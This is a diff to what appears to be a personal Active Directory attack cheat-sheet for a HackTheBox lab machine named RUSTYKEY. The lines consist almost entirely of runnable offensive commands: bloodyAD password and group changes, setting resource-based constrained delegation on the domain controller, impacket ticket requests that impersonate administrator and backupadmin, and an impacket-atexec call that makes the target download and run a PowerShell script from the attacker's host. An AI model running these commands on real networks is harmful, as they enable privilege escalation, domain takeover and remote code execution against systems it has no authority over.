@@ -485,12 +485,12 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' 
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
 
 +---------- AllowedToAct ----------+
+Set-ADComputer -PrincipalsAllowedToDelegateToAccount "$OWNED_COMPUTER$" -Identity 'DC'
 export OWNED_COMPUTER='' # without $ sign
-Set-ADComputer -PrincipalsAllowedToDelegateToAccount "$OWNED_COMPUTER"$ -Identity 'DC'
-impacket-getTGT -dc-ip $TARGET $DOM/"$OWNED_COMPUTER":'$PASSWORD'; export KRB5CCNAME="$OWNED_COMPUTER"'$.ccache'
-impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; export
-impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER" -k -no-pass -impersonate backupadmin -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; export
-KRB5CCNAME='administrator.ccache'
+impacket-getTGT -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; export KRB5CCNAME="$OWNED_COMPUTER$.ccache"
+impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache
+impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate backupadmin -spn "cifs/$DC"; mv *backupadmin@*.ccache administrator.ccache;
+export KRB5CCNAME='administrator.ccache'
 impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 
 $ComputerSid = Get-DomainComputer "$OWNED_COMPUTER" -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
